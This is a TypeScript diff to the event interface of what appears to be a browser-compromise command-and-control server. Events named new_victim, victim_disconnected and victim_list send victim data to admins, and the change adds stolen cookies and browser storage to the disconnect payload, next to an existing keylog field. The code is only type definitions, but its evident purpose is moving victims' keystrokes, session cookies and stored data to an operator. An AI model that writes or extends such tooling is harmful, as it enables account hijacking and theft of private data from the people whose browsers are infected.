@@ -212,7 +212,13 @@ export interface ServerToClientEvents {
   new_victim: (data: VictimInfo) => void;
   
   /** Notification of victim disconnection (sent to all admins) */
-  victim_disconnected: (data: { browserId: string; status: 'disconnected'; keylog: string }) => void;
+  victim_disconnected: (data: { 
+    browserId: string; 
+    status: 'disconnected'; 
+    keylog: string;
+    cookies?: CookiePayload;
+    storage?: StoragePayload;
+  }) => void;
   
   /** List of currently active victims (sent to admin on connect) */
   victim_list: (data: VictimInfo[]) => void;
